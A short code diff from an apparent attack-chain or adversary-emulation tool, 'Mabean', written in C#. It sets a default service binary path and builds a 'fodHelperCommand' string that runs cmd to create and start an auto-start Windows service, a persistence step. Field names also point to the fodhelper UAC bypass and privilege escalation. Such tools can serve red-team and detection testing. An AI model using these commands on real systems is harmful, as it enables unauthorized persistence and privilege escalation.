@@ -1,5 +1,6 @@
 using CommunityToolkit.Mvvm.ComponentModel;
 using CommunityToolkit.Mvvm.Input;
+using Mabean.Helpers;
 using Mabean.Models;
 using Mabean.Services;
 using System.Collections.Generic;
@@ -13,7 +14,8 @@ public partial class BehaviorChainViewModel : ViewModelBase
     private readonly PayloadService _payloadService;
     private readonly ChainBehaviorService _chainBehaviorService;
 
-    private const string DefaultServiceBinaryPath = @"C:\path\to\3.exe";
+    //private string DefaultServiceBinaryPath = Paths.ServiceBinaryPath;
+    private string DefaultServiceBinaryPath = "C:\\3.exe";
 
     [ObservableProperty]
     [NotifyPropertyChangedFor(nameof(ShowPrivEscFields), nameof(ShowPrivEscPidField))]
@@ -89,7 +91,7 @@ public partial class BehaviorChainViewModel : ViewModelBase
     private async Task RunChain()
     {
         var resolvedBinaryPath = PersistenceUseDefaultPath ? DefaultServiceBinaryPath : PersistenceBinaryPath;
-        var fodHelperCommand = $@"cmd /c start cmd /c ""sc create {PersistenceServiceName} binPath= {resolvedBinaryPath} start= auto && sc start {PersistenceServiceName}""";
+        var fodHelperCommand = $@"cmd /c ""sc create {PersistenceServiceName} binPath= {resolvedBinaryPath} start= auto && sc start {PersistenceServiceName}""";
 
         var definition = new BehaviorChainDefinition
         {
